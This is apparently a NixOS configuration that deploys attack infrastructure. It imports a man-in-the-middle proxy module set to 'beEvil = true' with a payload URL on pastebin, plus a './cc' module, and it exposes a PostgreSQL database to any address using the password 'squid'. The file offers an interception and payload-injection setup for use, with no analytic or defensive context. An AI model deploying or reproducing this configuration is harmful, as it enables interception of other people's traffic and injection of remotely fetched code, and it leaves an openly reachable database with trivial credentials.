# Simple complete system.
# All that's required is db setup.

{ pkgs, lib, ... }: {

  imports = [
    ./cc
    (import ./mitm {
      blooperParams = {
        adapter = "postgres";
        database = "squid";
        username = "squid";
        password = "squid";
        host = "localhost";
        encoding = "utf8";
      };
      allowConnect = true;
      beEvil = true;
      ignoreHosts = [ "my.domain:1337" ];
      payloadUrl = "https://pastebin.com/raw/cQLHTKsL";
    })
  ];

  services.postgresql = {
    enable = true;
    enableTCPIP = true;
    authentication = ''
      host squid squid 0.0.0.0/0 md5
    '';
  };

  networking.firewall.enable = true;
  networking.firewall.allowedTCPPorts = [
    5432
  ];

}
